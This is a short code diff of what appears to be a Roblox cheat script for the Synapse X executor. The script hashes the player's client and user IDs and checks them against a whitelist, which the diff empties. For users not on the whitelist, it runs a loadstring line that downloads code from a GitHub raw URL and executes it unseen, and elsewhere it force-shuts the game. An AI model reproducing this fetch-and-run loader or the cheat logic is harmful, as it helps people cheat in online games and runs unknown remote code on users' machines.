@@ -1,8 +1,8 @@
---ez
+-- Test
 -- setclipboard(syn.crypt.hash(game:GetService("RbxAnalyticsService"):GetClientId(), data))
 local Nerdx = syn.crypt.hash(game:GetService("RbxAnalyticsService"):GetClientId(), data)
 local userid = syn.crypt.hash(game.Players.LocalPlayer.UserId, data)
-local whitelisted = {"610ef79a96506e8698cef9085c2e2f3276d5cdf508522df2a87bacb6e53ff485021d01eba8341e8f095416f33bc8146a"}
+local whitelisted = {""}
 
 for i, v in pairs(whitelisted) do
     if v == Nerdx then
@@ -443,9 +443,6 @@ end)
 pcall(Nerdx)return nil
     else
 loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/extf"))();
-    end
-end
-
 
 pcall(function()
     getgenv().rconsoleprint = p
@@ -967,3 +964,7 @@ wait(2)
 game:shutdown()
 end
 end)
+end
+end
+
+
